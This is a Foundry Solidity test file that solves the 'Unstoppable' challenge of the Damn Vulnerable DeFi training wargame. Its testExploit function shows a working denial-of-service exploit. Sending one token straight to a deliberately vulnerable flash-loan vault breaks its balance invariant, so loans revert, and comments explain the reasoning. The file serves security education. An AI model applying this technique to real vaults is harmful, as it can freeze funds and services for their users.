// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {ReceiverUnstoppable} from "../src/Unstoppable/ReceiverUnstoppable.sol";
import {UnstoppableVault} from "../src/Unstoppable/UnstoppableVault.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

// There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
// To pass the challenge, make the vault stop offering flash loans.
// You start with 10 DVT tokens in balance.

contract UnstoppableTest is Test {
    uint256 constant TOKENS_IN_VAULT = 1_000_000 * 1e18;
    uint256 constant PLAYER_BALANCE = 10 * 1e18;

    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;

    address alice = address(0x42);
    address carol = address(0x69);

    function setUp() public {
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, address(this), address(this));
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(this));

        token.transfer(alice, PLAYER_BALANCE);
    }

    function testExploit() public {
        vm.startPrank(carol);
        receiver = new ReceiverUnstoppable(address(vault));
        receiver.executeFlashLoan(100 * 1e18);
        vm.stopPrank();

        // Contract assumes the following condition is met in flashLoan function.
        // assets * totalSupply / totalAssets() == totalAssets()
        // totalSupply * totalSupply / totalAssets() == totalAssets()
        // totalAssets() == totalSupply
        // balanceOf(address(this)) == totalSupply
        // So we can just change balance of the vault directly and break the
        // logic of the flashLoan function.
        vm.startPrank(alice);
        token.transfer(address(vault), 1);
        vm.stopPrank();

        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        vm.startPrank(carol);
        receiver.executeFlashLoan(100 * 1e18);
        vm.stopPrank();
    }
}
